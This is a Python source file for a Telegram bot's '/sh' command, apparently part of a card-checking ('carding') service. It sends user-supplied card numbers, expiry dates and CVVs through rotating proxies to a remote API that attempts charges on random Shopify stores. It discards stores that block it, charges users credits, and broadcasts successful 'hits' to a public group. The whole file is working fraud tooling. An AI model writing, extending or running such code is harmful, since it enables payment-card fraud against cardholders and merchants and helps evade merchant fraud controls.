"""
gates/shopify/sh.py

Single-card Shopify charge command (``/sh``) using the new API:

    GET https://web-production-b4ec9.up.railway.app/shopify?site=<site>&cc=<cc|mm|yy|cvv>&proxy=<proxy>
"""

from __future__ import annotations

import logging
import time

from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes, CommandHandler

from force_join import force_join
from utils.cards_ui import (
    APPROVED as UI_APPROVED,
    CHARGED as UI_CHARGED,
    DECLINED as UI_DECLINED,
    ERROR as UI_ERROR,
    format_card_result,
    processing_text as _ui_processing_text,
    result_buttons as _ui_result_buttons,
)
from utils.credits import consume_credit, is_unlimited
from utils.decorators import enforce_cooldown
from utils.plans import user_plan_label
from config import BOT_USERNAME, PUBLIC_GROUP_ID
from html import escape as escape_html
from .common import (
    STATUS_APPROVED,
    STATUS_CHARGED,
    STATUS_DECLINED,
    STATUS_ERROR,
    call_shopify_api,
    classify_response,
    format_gateway_with_price,
    get_proxies_for_user,
    get_user_sites,
    is_site_killed_by,
    normalize_card,
    pick_random,
    remove_user_site,
)


logger = logging.getLogger(__name__)


_UI_BUCKET = {
    STATUS_CHARGED: UI_CHARGED,
    STATUS_APPROVED: UI_APPROVED,
    STATUS_DECLINED: UI_DECLINED,
    STATUS_ERROR: UI_ERROR,
}


async def _try_site(card: str, sites: list, proxies: list, user_id: int, attempts: int = 5):
    """Try multiple random sites until one isn't auto-killed."""
    tried = set()
    last_response = None
    last_site = ""
    for _ in range(attempts):
        if not sites:
            break
        site = pick_random(sites)
        if not site or site in tried:
            continue
        tried.add(site)
        proxy = pick_random(proxies) or ""
        api_response = await call_shopify_api(card, site, proxy)
        last_response, last_site = api_response, site

        if is_site_killed_by(api_response):
            await remove_user_site(user_id, site)
            try:
                sites.remove(site)
            except ValueError:
                pass
            continue
        return api_response, site
    return last_response, last_site


@force_join
async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    if not await enforce_cooldown(user_id, update):
        return

    raw = ""
    if context.args:
        raw = " ".join(context.args)
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        raw = update.message.reply_to_message.text

    card = normalize_card(raw)
    if not card:
        await update.message.reply_text(
            "<b>Usage:</b> <code>/sh cc|mm|yy|cvv</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    sites = await get_user_sites(user_id)
    if not sites:
        await update.message.reply_text(
            "⚠️ <b>𝙉𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝙨𝙞𝙩𝙚𝙨 𝙖𝙙𝙙𝙚𝙙</b>\n𝘼𝙙𝙙 𝙨𝙞𝙩𝙚𝙨 𝙬𝙞𝙩𝙝 <code>/add</code>.",
            parse_mode=ParseMode.HTML,
        )
        return

    proxies = await get_proxies_for_user(user_id)
    if not proxies:
        await update.message.reply_text(
            "❌ <b>𝙉𝙤 𝙥𝙧𝙤𝙭𝙞𝙚𝙨 𝙘𝙤𝙣𝙛𝙞𝙜𝙪𝙧𝙚𝙙.</b>\n𝘼𝙙𝙙 𝙨𝙤𝙢𝙚 𝙬𝙞𝙩𝙝 <code>/addpxy</code>.",
            parse_mode=ParseMode.HTML,
        )
        return

    if not is_unlimited(user_id):
        if not await consume_credit(user_id):
            await update.message.reply_text(
                "❌ 𝙉𝙤𝙩 𝙚𝙣𝙤𝙪𝙜𝙝 𝙘𝙧𝙚𝙙𝙞𝙩𝙨.", parse_mode=ParseMode.HTML
            )
            return

    gateway_label = "Shopify"
    processing = await update.message.reply_text(
        _ui_processing_text(card, gateway_label),
        parse_mode=ParseMode.HTML,
    )

    start = time.time()
    api_response, site = await _try_site(card, sites[:], proxies, user_id, attempts=10)
    elapsed = time.time() - start

    if api_response is None:
        try:
            await processing.edit_text(
                "❌ 𝘼𝙡𝙡 𝙨𝙞𝙩𝙚𝙨 𝙧𝙚𝙩𝙪𝙧𝙣𝙚𝙙 𝙙𝙚𝙖𝙙 𝙧𝙚𝙨𝙥𝙤𝙣𝙨𝙚𝙨. 𝙏𝙧𝙮 𝙖𝙜𝙖𝙞𝙣 𝙤𝙧 𝙧𝙚𝙛𝙧𝙚𝙨𝙝 𝙨𝙞𝙩𝙚𝙨.",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
        return

    category = classify_response(api_response)
    plan, badge = await user_plan_label(user_id)
    plan_label = f"{plan} {badge}".strip()
    msg = await format_card_result(
        card=card,
        gateway=format_gateway_with_price(api_response.get("Gateway", "Shopify Payments"), api_response.get("Price")),
        response=api_response.get("Response", ""),
        price=api_response.get("Price", "-"),
        status=_UI_BUCKET.get(category, UI_ERROR),
        elapsed=elapsed,
        user=user,
        plan_label=plan_label,
    )

    try:
        await processing.edit_text(
            msg,
            parse_mode=ParseMode.HTML,
            reply_markup=_ui_result_buttons(),
            disable_web_page_preview=True,
        )
    except Exception:
        await update.message.reply_text(
            msg,
            parse_mode=ParseMode.HTML,
            reply_markup=_ui_result_buttons(),
            disable_web_page_preview=True,
        )

    # Broadcast Approved/Charged hits to public group
    if category in (STATUS_APPROVED, STATUS_CHARGED):
        try:
            status_label = "Charged" if category == STATUS_CHARGED else "Approved"
            gw_text = format_gateway_with_price(
                api_response.get("Gateway", "Shopify Payments"),
                api_response.get("Price"),
            )
            bot_link = f'<a href="https://t.me/{BOT_USERNAME}">𝘚𝘱𝘢𝘤𝘦 𝘊𝘩𝘬</a>'
            name = getattr(user, "first_name", None) or "User"
            if getattr(user, "last_name", None):
                name += f" {user.last_name}"
            profile = f'<a href="tg://user?id={user.id}">{escape_html(name)}</a>'
            hit_emoji = '<tg-emoji emoji-id="5041796412954641308">💎</tg-emoji>' if category == STATUS_CHARGED else '<tg-emoji emoji-id="5125343104638912114">✅</tg-emoji>'
            hit_message = (
                '<tg-emoji emoji-id="5219804923130038865">💎</tg-emoji> '
                '<b>𝑯𝑰𝑻 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅</b> '
                '<tg-emoji emoji-id="4916036072560919511">💎</tg-emoji>\n'
                '━━━━━━━━\n'
                f'𝘜𝘴𝘦𝘳 ➞ {profile}\n'
                f'𝘚𝘵𝘢𝘵𝘶𝘴 ➞ {escape_html(status_label)} {hit_emoji}\n'
                f'𝘙𝘦𝘴𝘱𝘰𝘯𝘴𝘦 ➞ <code>{escape_html(api_response.get("Response", ""))}</code>\n'
                f'𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ➞ {escape_html(gw_text)}\n'
                '━━━━━━━━\n'
                f'𝑯𝑰𝑻 𝑭𝒓𝒐𝒎 ➞ {bot_link}'
            )
            await context.bot.send_message(
                chat_id=PUBLIC_GROUP_ID,
                text=hit_message,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=False,
            )
        except Exception as e:
            logger.warning(f"sh send_hit failed: {e}")


def register_sh_handlers(application):
    """No-op for compatibility — /sh is registered via main.py's add_dual_command."""
    logger.info("✅ Shopify /sh command ready (registered via main)")

